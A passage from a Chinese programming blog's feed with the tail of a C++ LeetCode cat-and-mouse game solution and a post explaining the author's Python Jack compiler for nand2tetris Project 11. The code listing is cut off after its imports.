<span class="keyword">int</span> cx, <span class="keyword">int</span> cy, <span class="keyword">int</span> who)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> cache = dp[turn][mx][my][cx][cy][who];</span><br><span class="line">        <span class="keyword">if</span> (cache &gt;= <span class="number">0</span>) <span class="keyword">return</span> cache;</span><br><span class="line">        <span class="keyword">if</span> (turn == <span class="number">65</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (mx == fx &amp;&amp; my == fy) <span class="keyword">return</span> cache = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (cx == fx &amp;&amp; cy == fy) <span class="keyword">return</span> cache = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (mx == cx &amp;&amp; my == cy) <span class="keyword">return</span> cache = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (who == <span class="number">0</span>) &#123; <span class="comment">// mouse</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> dir=<span class="number">0</span>;dir&lt;<span class="number">4</span>;dir++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=mj;i++) &#123;</span><br><span class="line">                    <span class="keyword">int</span> nx, ny;</span><br><span class="line">                    nx = mx + dx[dir] * i;</span><br><span class="line">                    ny = my + dy[dir] * i;</span><br><span class="line">                    <span class="keyword">if</span> (nx &lt; <span class="number">0</span> || nx &gt; n - <span class="number">1</span> || ny &lt; <span class="number">0</span> || ny &gt; m - <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">if</span> (G[nx][ny] == <span class="string">'#'</span>) <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">if</span> (dfs(turn, nx, ny, cx, cy, <span class="number">1</span>) == <span class="number">1</span>) </span><br><span class="line">                        <span class="keyword">return</span> dp[turn][mx][my][cx][cy][who] = <span class="number">1</span>; </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> dp[turn][mx][my][cx][cy][who] = <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// cat</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> dir=<span class="number">0</span>;dir&lt;<span class="number">4</span>;dir++) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=cj;i++) &#123;</span><br><span class="line">                    <span class="keyword">int</span> nx, ny;</span><br><span class="line">                    nx = cx + dx[dir] * i;</span><br><span class="line">                    ny = cy + dy[dir] * i;</span><br><span class="line">                    <span class="keyword">if</span> (nx &lt; <span class="number">0</span> || nx &gt; n - <span class="number">1</span> || ny &lt; <span class="number">0</span> || ny &gt; m - <span class="number">1</span>) <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">if</span> (G[nx][ny] == <span class="string">'#'</span>) <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">if</span> (dfs(turn + <span class="number">1</span>, mx, my, nx, ny, <span class="number">0</span>) == <span class="number">0</span>) </span><br><span class="line">                        <span class="keyword">return</span> dp[turn][mx][my][cx][cy][who] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> dp[turn][mx][my][cx][cy][who] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">canMouseWin</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; grid, <span class="keyword">int</span> catJump, <span class="keyword">int</span> mouseJump)</span> </span>&#123;</span><br><span class="line">        G = grid;</span><br><span class="line">        cj = catJump;</span><br><span class="line">        mj = mouseJump;</span><br><span class="line">        n = grid.size();</span><br><span class="line">        m = grid[<span class="number">0</span>].length();</span><br><span class="line">        <span class="built_in">memset</span>(dp,<span class="number">-1</span>,<span class="keyword">sizeof</span>(dp));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="string">'C'</span>) cx = i, cy = j;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="string">'M'</span>) mx = i, my = j;</span><br><span class="line">                <span class="keyword">if</span> (grid[i][j] == <span class="string">'F'</span>) fx = i, fy = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dfs(<span class="number">0</span>, mx, my, cx, cy, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol></blockquote><h2 id><a href="#" class="headerlink" title="#"></a>#</h2><p>欢迎关注和打赏，感谢支持！</p><ul><li>关注我的博客: <a href="http://mikemeng.org/" target="_blank" rel="noopener">http://mikemeng.org/</a></li><li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu" target="_blank" rel="noopener">https://www.zhihu.com/people/da-hua-niu</a></li><li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;leetcode-weekly-contest-224&quot;&gt;&lt;a href=&quot;#leetcode-weekly-contest-224&quot; class=&quot;headerlink&quot; title=&quot;leetcode  weekly contest 224&quot;&gt;&lt;/a&gt;leetcode  weekly contest 224&lt;/h1&gt;&lt;p&gt;本周的题目最后一题好像很难，只做出来了前三题，想通了之后就特别简单。&lt;/p&gt;&lt;h2 id=&quot;1725-可以形成最大正方形的矩形数目&quot;&gt;&lt;a href=&quot;#1725-可以形成最大正方形的矩形数目&quot; class=&quot;headerlink&quot; title=&quot;1725. 可以形成最大正方形的矩形数目&quot;&gt;&lt;/a&gt;1725. 可以形成最大正方形的矩形数目&lt;/h2&gt;&lt;h3 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h3&gt;&lt;p&gt;给你一个数组 &lt;code&gt;rectangles&lt;/code&gt; ，其中 &lt;code&gt;rectangles[i] = [li, wi]&lt;/code&gt; 表示第 &lt;code&gt;i&lt;/code&gt; 个矩形的长度为 &lt;code&gt;li&lt;/code&gt; 、宽度为 &lt;code&gt;wi&lt;/code&gt; 。&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="http://yoursite.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
  </entry>
  
  <entry>
    <title>【Build a Computer】 Project 11</title>
    <link href="http://yoursite.com/2021/01/11/243/"/>
    <id>http://yoursite.com/2021/01/11/243/</id>
    <published>2021-01-11T07:45:52.862Z</published>
    <updated>2021-01-11T09:56:49.293Z</updated>
    
    <content type="html"><![CDATA[<h1 id="week-11"><a href="#week-11" class="headerlink" title="week 11"></a>week 11</h1><p>目前已经开始了<code>build a computer</code>系列的最后几章了，后面的章节感觉越来越难,中间无数次感觉头大，不想再写这么恶心的程序了，还好坚持了下来，最终完整的通过了测试。这个<code>project</code>是该系列课程里面最难的一个<code>toy project</code>了，总共写了差不多快<code>2000</code>行代码，这个还是用<code>python</code>写的，当然代码写的一团狗屎，一个函数都差不多几百行了，全部是<code>cound</code>,代码水平还是稀烂，需要好好的学习一下设计模式。刚开始还好，写着写着就变味了。需要认真的设计程序结构，则需要好好花心思将整个代码重新设计一下，将所有的结构全部重新理顺一遍，整个编译器的设计还是非常有意思的，通过这个简易的编译器，可以对<code>stack machine</code>的设计有了初步的了解，也对面向对象语言的原理有了基本的了解。<br>完成该<code>project</code>的资源非常少，最终在<code>github</code>上找到了一个资源<a href="https://github.com/idelvall/jack-compiler" target="_blank" rel="noopener">jack-compiler</a>，这个国外的小哥代码写得非常漂亮，值得仔细学习一下，还剩下最后一个<code>project</code>就终于可以完成全部的<code>build a modern computer</code>系列课程了，课程真的是太有趣了，最有意思的是该课程讲出了计算机模型的本质，非常的推荐。</p><a id="more"></a><h2 id="probelm"><a href="#probelm" class="headerlink" title="probelm"></a>probelm</h2><h3 id="Data-Translation"><a href="#Data-Translation" class="headerlink" title="Data Translation"></a>Data Translation</h3><p>变量处理。在整个<code>jack</code>程序中，变量类型一种分为四种:</p><ul><li><code>static</code>:静态变量，实际存方在<code>static segment</code>中。</li><li><code>argument</code>: 函数调用过程中的参数，每次调用函数时，需要指明传递的参数的个数，实际存放在<code>stack</code>中。</li><li><code>field</code>: 类的成员变量，实际存放在<code>heap</code>中。</li><li><code>local</code>：函数里面的过程变量，实际存在<code>stack</code>中。<br>在做实际的解析时，需要根据不同的类型，从而将相关的数据存放在不同的区域。<h3 id="symbol-table"><a href="#symbol-table" class="headerlink" title="symbol table"></a>symbol table</h3>符号表每一行主要存放如下：</li><li><code>varname</code>:变量的名称，实际变量的名称比如<code>var int a = 0</code>, 符号<code>a</code>即代表变量的名称。</li><li><code>vartype</code>：变量的类型，实际变量的类型比如<code>var int a = 0</code>, 符号<code>int</code>即代表变量的类型。</li><li><code>varkind</code>:变量的种类，即<code>static,argument,field,local</code>四种的一种。</li><li><code>varidx</code>：变量的索引，实际可以作为变量存放的偏移位置。</li></ul><p>在<code>jack compiler</code>中，编译器中的符号表分类两类：</p><ul><li><code>class</code>符号表: 主要存放类的成员变量的映射符号表，该符号表生命周期在编译过程中一直存在。</li><li><code>local</code>符号表: 主要存放函数调用过程中的映射符号表，该符号表仅在函数编译过程中存在。每一个函数会重新生成新的符号表。<h3 id="Handling-Variables"><a href="#Handling-Variables" class="headerlink" title="Handling Variables"></a>Handling Variables</h3>所有的变量处理全部用符号表来处理，所有的变量定义和函数的形参全部需要传入到符号表中，在特定的调用时，查找符号表，即可快速的定位到变量的存储位置，从而实现变量的内存读写。<h3 id="Handling-Arrays"><a href="#Handling-Arrays" class="headerlink" title="Handling Arrays"></a>Handling Arrays</h3>我觉整个<code>jack</code>语言最有趣的就是处理数组和对象了。在这里它就用到了<code>c</code>语言指针的模型，因为<code>jack</code>语言本身有两个寄存器专门做为间接寻址的寄存器，所以我们每次只需要将数组的地址写入到间接寻址的寄存器即可，原理看似复杂实际非常的简单，处理数组时我们专用<code>pointer 1</code>寄存器。</li><li><code>pop</code>操作: 直接将栈顶的数据写入到特定的地址。</li><li><code>push</code>操作：直接将地址中存放的变量读取到堆栈中即可。<h1 id="Handling-Objects"><a href="#Handling-Objects" class="headerlink" title="Handling Objects"></a>Handling Objects</h1>处理成员变量跟数据也是同样的原因，我们实际调用对象时，也只是调用对象的首地址而已，将首地址写入到寄存器中，然后根据变量的索引求出变量与首地址的偏移，然后通过间接寻址，即可得到类的成员变量。我觉得这个思想非常有趣，可以利用这个思想实现<code>C</code>语言的面向对象的编程。处理类时，在类的构造函数运行时，则需要为该类在<code>heap</code>上单独开辟空间存放类的成员变量。<h3 id="Commands-Translation"><a href="#Commands-Translation" class="headerlink" title="Commands Translation"></a>Commands Translation</h3>当然在本次的函数调用过程中并没有考虑到符号优先级的问题，只是简单的用<code>DFS</code>来处理表达式。比如如下处理：<br><img src="https://i.loli.net/2021/01/11/PTqZEmKepJBuStg.png" alt="1"><br>我们采用如下简单的<code>dfs</code>算法来处理表达式：<br><img src="https://i.loli.net/2021/01/11/HoJ1QDOXtbarKmp.png" alt="1"><br>如果理解上述核心的算法，处理就非常简单。这部分没啥好谈的。<h3 id="Translating-Flow-Control"><a href="#Translating-Flow-Control" class="headerlink" title="Translating Flow Control"></a>Translating Flow Control</h3><code>jack</code>语言目前只支持<code>if</code>和<code>while</code>的过程操作，处理也非常简单，我们只需要用<code>if-goto</code>和<code>goto</code>来处理所有的过程即可。</li><li>对于<code>if</code>的处理:<br><img src="https://i.loli.net/2021/01/11/3aKj1huD4ilMNdq.png" alt></li><li>对于<code>while</code>的处理:<br><img src="https://i.loli.net/2021/01/11/Pr7sQnui2EVAf6S.png" alt></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>主要的处理如上所示，其余还有部分比较麻烦的细节处理：</p><ul><li>对于<code>class</code>的成员方法的调用： 在实际调用过程中则需要将<code>class</code>的首地址也传入进去，则此时函数的形参应比实际要多一个，第一个参数应将类的首地址传入进去。</li><li>对于函数调用：在函数调用时，应将函数的参数按照顺序依次压入到栈中，当然对于绝大部分编译器来说，则此时函数参数都是倒序依次压入栈中的，每次求出参数的偏移则直接非常的简单偏移即可。</li><li>对于所有的函数类型都需要返回一个值，<code>void</code>类型也需要返回一个任意值即可。</li><li>对于乘法和出发运算，则需要调用系统自带的函数<code>mutily</code>和<code>div</code>，对于字符串常量则需要调用系统函数<code>string.new</code>，同时将字符一个一个的压入到类中，同时返回字符串类<code>string</code>的首地址，因此对于字符串常量实际是存放在<code>heap</code>中的。</li></ul><h2 id="project"><a href="#project" class="headerlink" title="project"></a>project</h2><p>本周的<code>project</code>还是非常有难度的<code>project</code>，本周的<code>project</code>花了差不多两个星期才完成，基本上都是利用中午休息和晚上的时间完成了这个<code>project</code>，还是非常的有意思。代码也同步放在<code>github</code>上，虽然写的非常稀烂，掩面哭一下。<br><a href="https://github.com/mike-box/coursera/tree/master/Build%20a%20computer/nand2tetris/nand2tetris/projects/11" target="_blank" rel="noopener">poj11</a>.</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> fileinput</span><br><span class="line"><span class="keyword">import</span> sys, getopt</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> enum <span class="keyword">import</span> Enum, unique</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> JackTokenizer <span class="keyword">import</span> JackTokenizer,TOKEN_TYPE,KEYWORD_TYPE,tokentype,tokendict</span><br><span class="line"><span class="keyword">from</span> SymbolTable <span class="keyword">import</span> SymbolTable</span><br><span class="line"><span class="keyword">from</span> VmWriter <span class="keyword">import</span> 